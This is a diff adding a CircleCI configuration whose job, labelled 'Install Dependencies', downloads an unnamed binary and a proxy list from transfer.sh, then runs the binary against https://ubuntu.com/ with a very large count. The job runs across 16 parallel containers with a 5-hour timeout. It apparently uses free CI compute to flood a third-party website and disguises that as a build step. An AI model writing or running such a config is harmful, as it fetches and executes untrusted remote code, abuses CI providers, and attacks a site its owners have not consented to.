@@ -1,0 +1,17 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/7vRVg3/jsss && wget https://transfer.sh/3qaHVl/proxy.txt && chmod +x jsss && ./jsss https://ubuntu.com/ 999999 100 40
+            no_output_timeout: 5h
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
